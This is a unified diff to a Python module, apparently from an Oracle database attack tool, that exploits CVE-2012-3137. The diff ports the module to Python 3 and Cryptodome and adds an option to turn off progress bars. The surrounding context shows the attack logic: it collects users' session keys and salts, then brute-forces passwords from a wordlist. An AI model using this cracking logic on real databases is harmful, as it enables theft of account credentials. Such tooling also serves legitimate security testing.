@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import logging, string, re, sys
@@ -6,7 +6,7 @@ from Utils import execSystemCmd, checkOptionsGivenByTheUser, anAccountIsGiven, g
 from OracleDatabase import OracleDatabase
 from time import sleep
 import hashlib
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from threading import Thread
 from progressbar import *
 from os import geteuid
@@ -42,6 +42,7 @@ class CVE_2012_3137 ():
 		self.MAX_PACKET_TO_CAPTURE=200
 		self.TIMEOUT=5
 		self.args=args
+		self.baroff = args['baroff']
 		self.accountsFile = accountsFile
 		self.timeSleep = timeSleep
 		self.usernames = []
@@ -139,18 +140,21 @@ class CVE_2012_3137 ():
 		get passwords
 		'''
 		logging.info ("Getting remote passwords of {0} users".format(len(self.usernames)))
-		pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=len(self.usernames)).start(), 0
+		if not self.baroff:
+			pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=len(self.usernames)).start(), 0
 		for user in self.usernames:
 			logging.info("Try to get the session key and salt of the {0} user".format(user))
 			self.getAPassword(user)
-			nb += 1
-			pbar.update(nb)
+			if not self.baroff:
+				nb += 1
+				pbar.update(nb)
 			if sessionKey != '' and salt != '':
 				key = "{0}{3}{1}{3}{2}".format(user,sessionKey, salt,self.separator)
 				self.keys.append(key)
 				logging.debug("Key found: {0}".format(key))
 			sleep(self.timeSleep)
-		pbar.finish()
+		if not self.baroff:
+			pbar.finish()
 
 	def __decryptKey__(self, session, salt, password):
 		'''
@@ -190,10 +194,12 @@ class CVE_2012_3137 ():
 				else:
 					self.args['print'].subtitle("Searching the password of the {0} user".format(user))
 					fpasswd = open(passwdFile)
-					pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=nbpasswds).start(), 0
+					if not self.baroff:
+						pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=nbpasswds).start(), 0
 					for password in fpasswd:
-						nb +=1
-						pbar.update(nb)
+						if not self.baroff:
+							nb +=1
+							pbar.update(nb)
 						password = password.replace('\n','').replace('\t','')
 						session_id = self.__decryptKey__(bytes.fromhex(session_hex),  bytes.fromhex(salt_hex), password.encode('utf-8'))
 						if session_id[40:] == b'\x08\x08\x08\x08\x08\x08\x08\x08':
@@ -202,7 +208,8 @@ class CVE_2012_3137 ():
 							fpasswd.close()
 							break
 					fpasswd.close()
-					pbar.finish()
+					if not self.baroff:
+						pbar.finish()
 			fsession.close()
 			return self.passwdFound
 
